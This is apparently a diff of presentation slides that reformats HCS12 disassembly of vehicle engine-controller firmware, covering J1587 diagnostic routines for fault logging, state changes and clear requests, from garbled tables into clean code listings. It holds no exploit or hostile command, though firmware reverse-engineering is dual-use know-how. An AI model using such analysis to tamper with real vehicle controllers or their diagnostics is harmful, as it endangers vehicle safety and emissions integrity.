-|**E8BEED:**|1869EA2953|**clrw**|0x2953,y|
-|**E8BEF2:**|E680|**ldab**|1+var_1,**sp**_; Load B_|
-|**E8BEF4:**|6B80|**stab**|1+var_1,**sp**_; Store B_|
-|**E8BEF6:**|042103|**dbne**|b,locE8BEFC_; Decrement counter and branch if != 0_|
-|**E8BEF9:**|792950|**clr**|_
-word_294F+1_; Clear memory_|
-|**E8BEFC:**|F6294D|**ldab**|byte_294D_; Load B_|
-|**E8BEFF:**|04010F|**dbeq**|b,loc_E8BF11_; Decrement counter and branch if = 0_|
-|**E8BF02:**|53|decb_; _|_Decrement B_|
-|**E8BF03:**|1826008B|**lbne**|loc_E8BF92_; Long branch if not equal_|
-|**E8BF07:**|F6294B|**ldab**|byte_294B_; Load B_|
-|**E8BF0A:**|53|decb_; _|_Decrement B_|
-|**E8BF0B:**|18260083|**lbne**|loc_E8BF92_; Long branch if not equal_|
-|**E8BF0F:**|207B|**bra**|loc_E8BF8C_; Branch always_|
-|**E8BF11:**|F6294B|**ldab**|byte294B_; Load B_|
-|**E8BF14:**|2610|**bne**|_
-loc_E8BF26_; Branch if not equal_|
-|**E8BF16:**|C602|**ldab**|#2_; Load B_|
-|**E8BF18:**|4ABCBBE8|**call**|gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E8BF1C:**|722950|**inc**|word_294F+1_; Increment memory_|
-|**E8BF1F:**|C601|**ldab**|#1_; Load B_|
-|**E8BF21:**|7B2951|**stab**|byte_2951_; Store B_|
-|**E8BF24:**|206C|**bra**|loc_E8BF92_; Branch always_|
-|**E8BF26:**|F62951|**ldab**|byte_2951_; Load B_|
-|**E8BF29:**|042103|**dbne**|b,loc_E8BF2F_; Decrement counter and branch if != 0_|
-|**E8BF2C:**|792951|**clr**|byte_2951_; Clear memory_|
-|**E8BF2F:**|FC5BD0|**ldd**|word_5BD0_; Load D_|
-|**E8BF32:**|8C00B4|**cpd**|#0xB4_; Compare D to memory (16-bit)_|
-|**E8BF35:**|2326|**bls**|loc_E8BF5D_; Branch if lower or same_|
-|**E8BF37:**|8C00C8|**cpd**|#0xC8_; Compare D to memory (16-bit)_|
-|**E8BF3A:**|2406|**bcc**|loc_E8BF42_; Branch if carry clear_|
-|**E8BF3C:**|1C2952FF|**bset**|byte_2952,#0xFF_; Set bits in memory_|
-|**E8BF40:**|201B|**bra**|locE8BF5D_;Branchalways_|
-|
-**E8BF42:**|
- F62952|**ldab**|_
-byte_2952_; Load B_|
-|**E8BF45:**|2616|**bne**|loc_E8BF5D_; Branch if not equal_|
-|**E8BF47:**|C601|**ldab**|#1_; Load B_|
-|**E8BF49:**|7B2952|**stab**|byte_2952_; Store B_|
-|**E8BF4C:**|87|clra_; _|_Clear A_|
-|**E8BF4D:**
-**E8BF4E:**|C7
- 7C2949|clrb_; _
-**std**|_Clear B_
-word2949_; Store D_|
-|**E8BF51:**|7C2945|**std**|_
-word_2945_; Store D_|
-|**E8BF54:**|7C2947|**std**|word2947_;StoreD_|
-|
-**E8BF57:**|
- 7C2943|**std**|_
-word2943_; Store D_|
-|**E8BF5A:**|792950|**clr**|_
-word294F+1_; Clear memory_|
-|**E8BF5D:**|FC2943|**ldd**|_
-word_2943_; Load D_|
-|**E8BF60:**|8C0064|**cpd**|#0x64 _; 'd'; Compare D to memory (16-bit)_|
-|**E8BF63:**|231A|**bls**|locE8BF7F_; Branch if lower or same_|
-|**E8BF65:**|FC2949|**ldd**|_
-word_2949_; Load D_|
-|**E8BF68:**|8C012C|**cpd**|#0x12C_;CompareDtomemory(16-bit)_|
-|
-**E8BF6B:**|
- 2212|**bhi**|
-loc_E8BF7F_; Branch if higher_|
-
-54
+```
+E8BED9: 37            pshb; Push B
+E8BEDA: 87            clra; Clear A
+E8BEDB: 6A80          staa    1+var_1,sp; Store A
+E8BEDD: F6294C        ldab    byte_294C; Load B
+E8BEE0: 59            lsld; Logic shift left D
+E8BEE1: B746          tfr     d,y; Transfer register to register
+E8BEE3: ECEA2953      ldd     0x2953,y; Load D
+E8BEE7: 2709          beq     loc_E8BEF2; Branch if equal
+E8BEE9: C601          ldab    #1; Load B
+E8BEEB: 6B80          stab    1+var_1,sp; Store B
+E8BEED: 1869EA2953    clrw    0x2953,y
+E8BEF2: E680          ldab    1+var_1,sp; Load B
+E8BEF4: 6B80          stab    1+var_1,sp; Store B
+E8BEF6: 042103        dbne    b,loc_E8BEFC; Decrement counter and branch if != 0
+E8BEF9: 792950        clr     word_294F+1; Clear memory
+E8BEFC: F6294D        ldab    byte_294D; Load B
+E8BEFF: 04010F        dbeq    b,loc_E8BF11; Decrement counter and branch if = 0
+E8BF02: 53            decb; Decrement B
+E8BF03: 1826008B      lbne    loc_E8BF92; Long branch if not equal
+E8BF07: F6294B        ldab    byte_294B; Load B
+E8BF0A: 53            decb; Decrement B
+E8BF0B: 18260083      lbne    loc_E8BF92; Long branch if not equal
+E8BF0F: 207B          bra     loc_E8BF8C; Branch always
+E8BF11: F6294B        ldab    byte_294B; Load B
+E8BF14: 2610          bne     loc_E8BF26; Branch if not equal
+E8BF16: C602          ldab    #2; Load B
+E8BF18: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E8BF1C: 722950        inc     word_294F+1; Increment memory
+E8BF1F: C601          ldab    #1; Load B
+E8BF21: 7B2951        stab    byte_2951; Store B
+E8BF24: 206C          bra     loc_E8BF92; Branch always
+E8BF26: F62951        ldab    byte_2951; Load B
+E8BF29: 042103        dbne    b,loc_E8BF2F; Decrement counter and branch if != 0
+E8BF2C: 792951        clr     byte_2951; Clear memory
+E8BF2F: FC5BD0        ldd     word_5BD0; Load D
+E8BF32: 8C00B4        cpd     #0xB4; Compare D to memory (16-bit)
+E8BF35: 2326          bls     loc_E8BF5D; Branch if lower or same
+E8BF37: 8C00C8        cpd     #0xC8; Compare D to memory (16-bit)
+E8BF3A: 2406          bcc     loc_E8BF42; Branch if carry clear
+E8BF3C: 1C2952FF      bset    byte_2952,#0xFF; Set bits in memory
+E8BF40: 201B          bra     loc_E8BF5D; Branch always
+E8BF42: F62952        ldab    byte_2952; Load B
+E8BF45: 2616          bne     loc_E8BF5D; Branch if not equal
+E8BF47: C601          ldab    #1; Load B
+E8BF49: 7B2952        stab    byte_2952; Store B
+E8BF4C: 87            clra; Clear A
+E8BF4D: C7            clrb; Clear B
+E8BF4E: 7C2949        std     word_2949; Store D
+E8BF51: 7C2945        std     word_2945; Store D
+E8BF54: 7C2947        std     word_2947; Store D
+E8BF57: 7C2943        std     word_2943; Store D
+E8BF5A: 792950        clr     word_294F+1; Clear memory
+E8BF5D: FC2943        ldd     word_2943; Load D
+E8BF60: 8C0064        cpd     #0x64 ; 'd'; Compare D to memory (16-bit)
+E8BF63: 231A          bls     loc_E8BF7F; Branch if lower or same
+E8BF65: FC2949        ldd     word_2949; Load D
+E8BF68: 8C012C        cpd     #0x12C; Compare D to memory (16-bit)
+E8BF6B: 2212          bhi     loc_E8BF7F; Branch if higher
+```
 
 ## Slide 55
 
-|**E8BF6D:**
-_sub_
-↪
-|4A8420E9
-_routine in expa_
-|**call**
-_nded mem_
-|gone_J1587_Diag_Get_Next_Active_Fault_E98420,#0xE9_; Call_
-_ory_
-|
-|---|---|---|---|
-|**E8BF71:**|042104|**dbne**|b,loc_E8BF78_; Decrement counter and branch if != 0_|
-|**E8BF74:**|C603|**ldab**|#3_; Load B_|
-|**E8BF76:**|2010|**bra**|loc_E8BF88_; Branch always_|
-|**E8BF78:**|F62950|**ldab**|word_294F+1_; Load B_|
-|**E8BF7B:**|2715|**beq**|loc_E8BF92_; Branch if equal_|
-|**E8BF7D:**|2008|**bra**|loc_E8BF87_; Branch always_|
-|**E8BF7F:**|FC2949|**ldd**|word_2949_; Load D_|
-|**E8BF82:**|8C012C|**cpd**|#0x12C_; Compare D to memory (16-bit)_|
-|**E8BF85:**|230B|**bls**|loc_E8BF92_; Branch if lower or same_|
-|**E8BF87:**|C7|clrb_;_|_Clear B_|
-|**E8BF88:**|4ABC93E8|**call**|gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E8BF8C:**|C601|**ldab**|#1_; Load B_|
-|**E8BF8E:**|4ABCBBE8|**call**|gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E8BF92:**|1B81|**ins**_; _|_Increment SP_|
-|**E8BF94:**|0A|**rtc**_; _|_Return from call_|
+```
+E8BF6D: 4A8420E9      call    gone_J1587_Diag_Get_Next_Active_Fault_E98420,#0xE9; Call
+↪   subroutine in expanded memory
+E8BF71: 042104        dbne    b,loc_E8BF78; Decrement counter and branch if != 0
+E8BF74: C603          ldab    #3; Load B
+E8BF76: 2010          bra     loc_E8BF88; Branch always
+E8BF78: F62950        ldab    word_294F+1; Load B
+E8BF7B: 2715          beq     loc_E8BF92; Branch if equal
+E8BF7D: 2008          bra     loc_E8BF87; Branch always
+E8BF7F: FC2949        ldd     word_2949; Load D
+E8BF82: 8C012C        cpd     #0x12C; Compare D to memory (16-bit)
+E8BF85: 230B          bls     loc_E8BF92; Branch if lower or same
+E8BF87: C7            clrb; Clear B
+E8BF88: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E8BF8C: C601          ldab    #1; Load B
+E8BF8E: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E8BF92: 1B81          ins; Increment SP
+E8BF94: 0A            rtc; Return from call
+```
 
 #### **sub_E98000** :
 
-|**E98000:**|37|**pshb**_; _|_Push B_|
-|---|---|---|---|
-|**E98001:**|87|clra_; _|_Clear A_|
-|**E98002:**|6A80|**staa**|1+var_1,**sp**_; Store A_|
-|**E98004:**|F6294C|**ldab**|byte_294C_; Load B_|
-|**E98007:**|59|**lsld**_; _|_Logic shift left D_|
-|**E98008:**|B746|**tfr**|d,y_; Transfer register to register_|
-|**E9800A:**|ECEA2953|**ldd**|0x2953,y_; Load D_|
-|**E9800E:**|2709|**beq**|loc_E98019_; Branch if equal_|
-|**E98010:**|C601|**ldab**|#1_; Load B_|
-|**E98012:**|6B80|**stab**|1+var_1,**sp**_; Store B_|
-|**E98014:**|1869EA2953|**clrw**|0x2953,y|
-|**E98019:**|E680|**ldab**|1+var_1,**sp**_; Load B_|
-|**E9801B:**|6B80|**stab**|1+var_1,**sp**_; Store B_|
-|**E9801D:**|042108|**dbne**|b,loc_E98028_; Decrement counter and branch if != 0_|
-|**E98020:**|1879295B|**clrw**|word_295B|
-|**E98024:**|1D296340|**bclr**|byte_2963,#0x40 _; '@'; Clear bits in memory_|
-|**E98028:**|F6294D|**ldab**|byte_294D_; Load B_|
-|**E9802B:**|040111|**dbeq**|b,loc_E9803F_; Decrement counter and branch if = 0_|
-|**E9802E:**|042155|**dbne**|b,loc_E98086_; Decrement counter and branch if != 0_|
-|**E98031:**|F6294B|**ldab**|byte_294B_; Load B_|
-|**E98034:**|04214F|**dbne**|b,loc_E98086_; Decrement counter and branch if != 0_|
-|**E98037:**|C601|**ldab**|#1_; Load B_|
-|**E98039:**|4ABCBBE8|**call**|gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E9803D:**|2047|**bra**|loc_E98086_; Branch always_|
-|**E9803F:**|F6294B|**ldab**|byte_294B_; Load B_|
-|**E98042:**|260D|**bne**|loc_E98051_; Branch if not equal_|
-|**E98044:**|C602|**ldab**|#2_; Load B_|
-|**E98046:**|4ABCBBE8|**call**|gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8_; Call subroutine in_|
-|_exp_
-↪|_anded memory_|||
-|**E9804A:**|C601|**ldab**|#1_; Load B_|
-|**E9804C:**|7B2951|**stab**|byte_2951_; Store B_|
-|**E9804F:**|2035|**bra**|loc_E98086_; Branch always_|
-|**E98051:**|F62951|**ldab**|byte_2951_; Load B_|
-|**E98054:**|042119|**dbne**|b,loc_E98070_; Decrement counter and branch if != 0_|
-
-55
+```
+E98000: 37            pshb; Push B
+E98001: 87            clra; Clear A
+E98002: 6A80          staa    1+var_1,sp; Store A
+E98004: F6294C        ldab    byte_294C; Load B
+E98007: 59            lsld; Logic shift left D
+E98008: B746          tfr     d,y; Transfer register to register
+E9800A: ECEA2953      ldd     0x2953,y; Load D
+E9800E: 2709          beq     loc_E98019; Branch if equal
+E98010: C601          ldab    #1; Load B
+E98012: 6B80          stab    1+var_1,sp; Store B
+E98014: 1869EA2953    clrw    0x2953,y
+E98019: E680          ldab    1+var_1,sp; Load B
+E9801B: 6B80          stab    1+var_1,sp; Store B
+E9801D: 042108        dbne    b,loc_E98028; Decrement counter and branch if != 0
+E98020: 1879295B      clrw    word_295B
+E98024: 1D296340      bclr    byte_2963,#0x40 ; '@'; Clear bits in memory
+E98028: F6294D        ldab    byte_294D; Load B
+E9802B: 040111        dbeq    b,loc_E9803F; Decrement counter and branch if = 0
+E9802E: 042155        dbne    b,loc_E98086; Decrement counter and branch if != 0
+E98031: F6294B        ldab    byte_294B; Load B
+E98034: 04214F        dbne    b,loc_E98086; Decrement counter and branch if != 0
+E98037: C601          ldab    #1; Load B
+E98039: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E9803D: 2047          bra     loc_E98086; Branch always
+E9803F: F6294B        ldab    byte_294B; Load B
+E98042: 260D          bne     loc_E98051; Branch if not equal
+E98044: C602          ldab    #2; Load B
+E98046: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E9804A: C601          ldab    #1; Load B
+E9804C: 7B2951        stab    byte_2951; Store B
+E9804F: 2035          bra     loc_E98086; Branch always
+E98051: F62951        ldab    byte_2951; Load B
+E98054: 042119        dbne    b,loc_E98070; Decrement counter and branch if != 0
+```
 
 ## Slide 56
 
-**E98057:** 792951 **clr** byte_2951 _; Clear memory_ **E9805A:** F62940 **ldab** byte_2940 _; Load B_ **E9805D:** 2704 **beq** loc_E98063 _; Branch if equal_ **E9805F:** 4A8337E9 **call** gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9 _; Call subroutine_ ↪ _in expanded memory_ **E98063:** C7 clrb _; Clear B_ **E98064:** 4ABC93E8 **call** gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E98068:** C601 **ldab** #1 _; Load B_ **E9806A:** 4ABCBBE8 **call** gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8 _; Call subroutine in_ ↪ _expanded memory_ **E9806E:** 2016 **bra** loc_E98086 _; Branch always_ **E98070:** F6294F **ldab** word_294F _; Load B_ **E98073:** 040106 **dbeq** b,loc_E9807C _; Decrement counter and branch if = 0_ **E98076:** C002 **subb** #2 _; Subtract memory from B_ **E98078:** 2708 **beq** loc_E98082 _; Branch if equal_ **E9807A:** 200A **bra** loc_E98086 _; Branch always_ **E9807C:** 4A8089E9 **call** gone_J1587_Diag_Broadcast_Rate_Control_E98089,#0xE9 _; Call_ ↪ _subroutine in expanded memory_ **E98080:** 2004 **bra** loc_E98086 _; Branch always_ **E98082:** 4A8336E9 **call** gone_J1587_Diag_Null_E98336,#0xE9 _; Call subroutine in expanded_ ↪ _memory_ **E98086:** 1B81 **ins** _; Increment SP_ **E98088:** 0A **rtc** _; Return from call_
+```
+E98057: 792951        clr     byte_2951; Clear memory
+E9805A: F62940        ldab    byte_2940; Load B
+E9805D: 2704          beq     loc_E98063; Branch if equal
+E9805F: 4A8337E9      call    gone_J1587_Diag_Reset_Runtime_State_E98337,#0xE9; Call subroutine
+↪   in expanded memory
+E98063: C7            clrb; Clear B
+E98064: 4ABC93E8      call    gone_J1587_Diag_Rotate_Log_Counts_E8BC93,#0xE8; Call subroutine in
+↪   expanded memory
+E98068: C601          ldab    #1; Load B
+E9806A: 4ABCBBE8      call    gone_J1587_Diag_Set_State_Var_E8BCBB,#0xE8; Call subroutine in
+↪   expanded memory
+E9806E: 2016          bra     loc_E98086; Branch always
+E98070: F6294F        ldab    word_294F; Load B
+E98073: 040106        dbeq    b,loc_E9807C; Decrement counter and branch if = 0
+E98076: C002          subb    #2; Subtract memory from B
+E98078: 2708          beq     loc_E98082; Branch if equal
+E9807A: 200A          bra     loc_E98086; Branch always
+E9807C: 4A8089E9      call    gone_J1587_Diag_Broadcast_Rate_Control_E98089,#0xE9; Call
+↪   subroutine in expanded memory
+E98080: 2004          bra     loc_E98086; Branch always
+E98082: 4A8336E9      call    gone_J1587_Diag_Null_E98336,#0xE9; Call subroutine in expanded
+↪   memory
+E98086: 1B81          ins; Increment SP
+E98088: 0A            rtc; Return from call
+```
 
-**sub_E98089** :
+#### **sub_E98089** :
 
-**E98089:** 1B9B **leas** -5, **sp** _; Load effective address into SP_ **E9808B:** 87 clra _; Clear A_ **E9808C:** C7 clrb _; Clear B_ **E9808D:** 6C81 **std** 5+var_4, **sp** _; Store D_ **E9808F:** F62950 **ldab** word_294F+1 _; Load B_ **E98092:** 53 decb _; Decrement B_ **E98093:** C108 **cmpb** #8 _; Compare B to memory_ **E98095:** 1824028F **lbcc** loc_E98328 _; Long branch if carry clear_ **E98099:** 59 **lsld** _; Logic shift left D_ **E9809A:** 05FF **jmp** [d,pc] _; jump table analyzed_ **E980AC:** F62940 **ldab** byte_2940 _; Load B_ **E980AF:** 270A **beq** loc_E980BB _; Branch if equal_ **E980B1:** 53 decb _; Decrement B_ **E980B2:** 1827024D **lbeq** loc_E98303 _; Long branch if equal_ **E980B6:** 53 decb _; Decrement B_ **E980B7:** 18260278 **lbne** loc_E98333 _; Long branch if not equal_ **E980BB:** 6980 **clr** 5+var_5, **sp** _; Clear memory_ **E980BD:** 6984 **clr** 5+var_1, **sp** _; Clear memory_ **E980BF:** 2070 **bra** loc_E98131 _; Branch always_ **E980C1:** 6983 **clr** 5+var_2, **sp** _; Clear memory_ **E980C3:** FC295B **ldd** word_295B _; Load D_ **E980C6:** 4A8936F1 **call** core_F18936,#0xF1 _; Call subroutine in expanded memory_ **E980CA:** 044102 **tbeq** b,loc_E980CF _; Test counter and branch if = 0_ **E980CD:** 6283 **inc** 5+var_2, **sp** _; Increment memory_ **E980CF:** FC295B **ldd** word_295B _; Load D_ **E980D2:** 4A8964F1 **call** sub_F18964,#0xF1 _; Call subroutine in expanded memory_ **E980D6:** 044106 **tbeq** b,loc_E980DF _; Test counter and branch if = 0_ **E980D9:** E683 **ldab** 5+var_2, **sp** _; Load B_ **E980DB:** CB02 **addb** #2 _; Add memory to B_ **E980DD:** 6B83 **stab** 5+var_2, **sp** _; Store B_
-
-56
+```
+E98089: 1B9B          leas    -5,sp; Load effective address into SP
+E9808B: 87            clra; Clear A
+E9808C: C7            clrb; Clear B
+E9808D: 6C81          std     5+var_4,sp; Store D
+E9808F: F62950        ldab    word_294F+1; Load B
+E98092: 53            decb; Decrement B
+E98093: C108          cmpb    #8; Compare B to memory
+E98095: 1824028F      lbcc    loc_E98328; Long branch if carry clear
+E98099: 59            lsld; Logic shift left D
+E9809A: 05FF          jmp     [d,pc]; jump table analyzed
+E980AC: F62940        ldab    byte_2940; Load B
+E980AF: 270A          beq     loc_E980BB; Branch if equal
+E980B1: 53            decb; Decrement B
+E980B2: 1827024D      lbeq    loc_E98303; Long branch if equal
+E980B6: 53            decb; Decrement B
+E980B7: 18260278      lbne    loc_E98333; Long branch if not equal
+E980BB: 6980          clr     5+var_5,sp; Clear memory
+E980BD: 6984          clr     5+var_1,sp; Clear memory
+E980BF: 2070          bra     loc_E98131; Branch always
+E980C1: 6983          clr     5+var_2,sp; Clear memory
+E980C3: FC295B        ldd     word_295B; Load D
+E980C6: 4A8936F1      call    core_F18936,#0xF1; Call subroutine in expanded memory
+E980CA: 044102        tbeq    b,loc_E980CF; Test counter and branch if = 0
+E980CD: 6283          inc     5+var_2,sp; Increment memory
+E980CF: FC295B        ldd     word_295B; Load D
+E980D2: 4A8964F1      call    sub_F18964,#0xF1; Call subroutine in expanded memory
+E980D6: 044106        tbeq    b,loc_E980DF; Test counter and branch if = 0
+E980D9: E683          ldab    5+var_2,sp; Load B
+E980DB: CB02          addb    #2; Add memory to B
+E980DD: 6B83          stab    5+var_2,sp; Store B
+```
 
 ## Slide 57
 
-|**E980DF:**
-**E980E1:**|E683
-04010A|**ldab**
-**dbeq**|5+var_2,**sp**_; Load B_
-blocE980EE_;Decrementcounterandbranchif=0_|
-|---|---|---|---|
-|
-**E980E4:**|
- 04010F|**dbeq**|,       _
-b,loc_E980F6_; Decrement counter and branch if = 0_|
-|**E980E7:**|040113|**dbeq**|b,loc_E980FD_; Decrement counter and branch if = 0_|
-|**E980EA:**|6981|**clr**|5+var_4,**sp**_; Clear memory_|
-|**E980EC:**|2032|**bra**|loc_E98120_; Branch always_|
-|**E980EE:**|F62950|**ldab**|word_294F+1_; Load B_|
-|**E980F1:**|53|decb_; _|_Decrement B_|
-|**E980F2:**|262C|**bne**|loc_E98120_; Branch if not equal_|
-|**E980F4:**
-|200E
-|**bra**
-|loc_E98104_; Branch always_
-|
-|**E980F6:**|F62950|**ldab**|word_294F+1_; Load B_|
-|**E980F9:**|C102|**cmpb**|#2_; Compare B to memory_|
-|**E980FB:**|2005|**bra**|loc_E98102_; Branch always_|
-|**E980FD:**|F62950|**ldab**|word_294F+1_; Load B_|
-|**E98100:**|C101|**cmpb**|#1_; Compare B to memory_|
-|**E98102:**|261C|**bne**|locE98120_; Branch if not equal_|
-|**E98104:**|FD295B|**ldy**|_
-word_295B_; Load Y_|
-|**E98107:**|1858|asly||
-|**E98109:**|180B7E0010|**movb**|#0x7E,MMC_GPAGE _; '~'; Move byte (8-bit)_|
-|**E9810E:**|18E6EA5F6F|**gldab**|0x5F6F,y|
-|**E98113:**|6B81|**stab**|5+var_4,**sp**_; Store B_|
-|**E98115:**|18E6EA5F70|**gldab**|0x5F70,y|
-|**E9811A:**|6B82|**stab**|5+var_3,**sp**_; Store B_|
-|**E9811C:**|C601|**ldab**|#1_; Load B_|
-|**E9811E:**|6B80|**stab**|5+var_5,**sp**_; Store B_|
-|**E98120:**|E682|**ldab**|5+var_3,**sp**_; Load B_|
-|**E98122:**|87|clra_; _|_Clear A_|
-|**E98123:**|EB81|**addb**|5+var_4,**sp**_; Add memory to B_|
-|**E98125:**|45|rola_; _|_Rotate left A through carry_|
-|**E98126:**|046402|**tbne**|d,loc_E9812B_; Test counter and branch if != 0_|
-|**E98129:**|6980|**clr**|5+var_5,**sp**_; Clear memory_|
-|**E9812B:**|6284|**inc**|5+var_1,**sp**_; Increment memory_|
-|**E9812D:**|1872295B|**incw**|word_295B|
-|**E98131:**|FC295B|**ldd**|word_295B_; Load D_|
-|**E98134:**|8C0156|**cpd**|#0x156_; Compare D to memory (16-bit)_|
-|**E98137:**|240C|**bcc**|loc_E98145_; Branch if carry clear_|
-|**E98139:**|E680|**ldab**|5+var_5,**sp**_; Load B_|
-|**E9813B:**|2608|**bne**|loc_E98145_; Branch if not equal_|
-|**E9813D:**|E684|**ldab**|5+var_1,**sp**_; Load B_|
-|**E9813F:**|C105|**cmpb**|#5_; Compare B to memory_|
-|**E98141:**|1825FF7C|**lbcs**|loc_E980C1_; Long branch if carry set_|
-|**E98145:**|E680|**ldab**|5+var_5,**sp**_; Load B_|
-|**E98147:**|264B|**bne**|loc_E98194_; Branch if not equal_|
-|**E98149:**|FC295B|**ldd**|word_295B_; Load D_|
-|**E9814C:**|8C0156|**cpd**|#0x156_; Compare D to memory (16-bit)_|
-|**E9814F:**|2643|**bne**|locE98194_; Branch if not equal_|
-|**E98151:**|F62907|**ldab**|_
-byte_2907_; Load B_|
-|**E98154:**|260D|**bne**|loc_E98163_; Branch if not equal_|
-|**E98156:**|C601|**ldab**|#1_; Load B_|
-|**E98158:**|6B81|**stab**|5+var4,**sp**_; Store B_|
-|**E9815A:**|6B82|**stab**|_
-5+var_3,**sp**_; Store B_|
-|**E9815C:**|7B2906|**stab**|byte_2906_; Store B_|
-|**E9815F:**|6B80|**stab**|5+var_5,**sp**_; Store B_|
-|**E98161:**|2031|**bra**|loc_E98194_; Branch always_|
-|**E98163:**|C601|**ldab**|#1_; Load B_|
-|**E98165:**|7B2908|**stab**|byte_2908_; Store B_|
-|**E98168:**|CC01F4|**ldd**|#0x1F4_; Load D_|
-|**E9816B:**|7C2909|**std**|word2909_;StoreD_|
-|
-**E9816E:**|
- 18C7|clry|_|
-
-57
+```
+E980DF: E683          ldab    5+var_2,sp; Load B
+E980E1: 04010A        dbeq    b,loc_E980EE; Decrement counter and branch if = 0
+E980E4: 04010F        dbeq    b,loc_E980F6; Decrement counter and branch if = 0
+E980E7: 040113        dbeq    b,loc_E980FD; Decrement counter and branch if = 0
+E980EA: 6981          clr     5+var_4,sp; Clear memory
+E980EC: 2032          bra     loc_E98120; Branch always
+E980EE: F62950        ldab    word_294F+1; Load B
+E980F1: 53            decb; Decrement B
+E980F2: 262C          bne     loc_E98120; Branch if not equal
+E980F4: 200E          bra     loc_E98104; Branch always
+E980F6: F62950        ldab    word_294F+1; Load B
+E980F9: C102          cmpb    #2; Compare B to memory
+E980FB: 2005          bra     loc_E98102; Branch always
+E980FD: F62950        ldab    word_294F+1; Load B
+E98100: C101          cmpb    #1; Compare B to memory
+E98102: 261C          bne     loc_E98120; Branch if not equal
+E98104: FD295B        ldy     word_295B; Load Y
+E98107: 1858          asly
+E98109: 180B7E0010    movb    #0x7E,MMC_GPAGE ; '~'; Move byte (8-bit)
+E9810E: 18E6EA5F6F    gldab   0x5F6F,y
+E98113: 6B81          stab    5+var_4,sp; Store B
+E98115: 18E6EA5F70    gldab   0x5F70,y
+E9811A: 6B82          stab    5+var_3,sp; Store B
+E9811C: C601          ldab    #1; Load B
+E9811E: 6B80          stab    5+var_5,sp; Store B
+E98120: E682          ldab    5+var_3,sp; Load B
+E98122: 87            clra; Clear A
+E98123: EB81          addb    5+var_4,sp; Add memory to B
+E98125: 45            rola; Rotate left A through carry
+E98126: 046402        tbne    d,loc_E9812B; Test counter and branch if != 0
+E98129: 6980          clr     5+var_5,sp; Clear memory
+E9812B: 6284          inc     5+var_1,sp; Increment memory
+E9812D: 1872295B      incw    word_295B
+E98131: FC295B        ldd     word_295B; Load D
+E98134: 8C0156        cpd     #0x156; Compare D to memory (16-bit)
+E98137: 240C          bcc     loc_E98145; Branch if carry clear
+E98139: E680          ldab    5+var_5,sp; Load B
+E9813B: 2608          bne     loc_E98145; Branch if not equal
+E9813D: E684          ldab    5+var_1,sp; Load B
+E9813F: C105          cmpb    #5; Compare B to memory
+E98141: 1825FF7C      lbcs    loc_E980C1; Long branch if carry set
+E98145: E680          ldab    5+var_5,sp; Load B
+E98147: 264B          bne     loc_E98194; Branch if not equal
+E98149: FC295B        ldd     word_295B; Load D
+E9814C: 8C0156        cpd     #0x156; Compare D to memory (16-bit)
+E9814F: 2643          bne     loc_E98194; Branch if not equal
+E98151: F62907        ldab    byte_2907; Load B
+E98154: 260D          bne     loc_E98163; Branch if not equal
+E98156: C601          ldab    #1; Load B
+E98158: 6B81          stab    5+var_4,sp; Store B
+E9815A: 6B82          stab    5+var_3,sp; Store B
+E9815C: 7B2906        stab    byte_2906; Store B
+E9815F: 6B80          stab    5+var_5,sp; Store B
+E98161: 2031          bra     loc_E98194; Branch always
+E98163: C601          ldab    #1; Load B
+E98165: 7B2908        stab    byte_2908; Store B
+E98168: CC01F4        ldd     #0x1F4; Load D
+E9816B: 7C2909        std     word_2909; Store D
+E9816E: 18C7          clry
+```
 
 ## Slide 58
 
-|**E98170:**
-**E98173:**|7D290B
-CC00FA|**sty**
-**ldd**|word_290B_; Store Y_
-#0xFA_;LoadD_|
-|---|---|---|---|
-|
-**E98176:**|
- 7C290D|**std**|
-word_290D_; Store D_|
-|**E98179:**|79290F|**clr**|byte_290F_; Clear memory_|
-|**E9817C:**|7D2910|**sty**|word_2910_; Store Y_|
-|**E9817F:**|7D2912|**sty**|word_2912_; Store Y_|
-|**E98182:**|C696|**ldab**|#0x96_; Load B_|
-|**E98184:**|7C2914|**std**|word_2914_; Store D_|
-|**E98187:**|C601|**ldab**|#1_; Load B_|
-|**E98189:**
-|7B2906
-|**stab**
-|byte_2906_; Store B_
-|
-|**E9818C:**|1C296340|**bset**|byte_2963,#0x40 _; '@'; Set bits in memory_|
-|**E98190:**|4A834FE9|**call**|gone_J1587_Diag_Process_Clear_Request_E9834F,#0xE9_; Call_|
-|_sub_
-↪|_routine in expa_|_nded memo_|_ry_|
-|**E98194:**|E680|**ldab**|5+var_5,**sp**_; Load B_|
-|**E98196:**|53|decb_; _|_Decrement B_|
-|**E98197:**|18260198|**lbne**|loc_E98333_; Long branch if not equal_|
-|**E9819B:**|180D812908|**movb**|5+var_4,**sp**,byte_2908_; Move byte (8-bit)_|
-|**E981A0:**|CC0032|**ldd**|#0x32 _; '2'; Load D_|
-|**E981A3:**|7C2909|**std**|word_2909_; Store D_|
-|**E981A6:**|7C290B|**std**|word_290B_; Store D_|
-|**E981A9:**|CC012C|**ldd**|#0x12C_; Load D_|
-|**E981AC:**|7C290D|**std**|word_290D_; Store D_|
-|**E981AF:**|180D82290F|**movb**|5+var_3,**sp**,byte_290F_; Move byte (8-bit)_|
-|**E981B4:**|CC0032|**ldd**|#0x32 _; '2'; Load D_|
-|**E981B7:**|7C2910|**std**|word_2910_; Store D_|
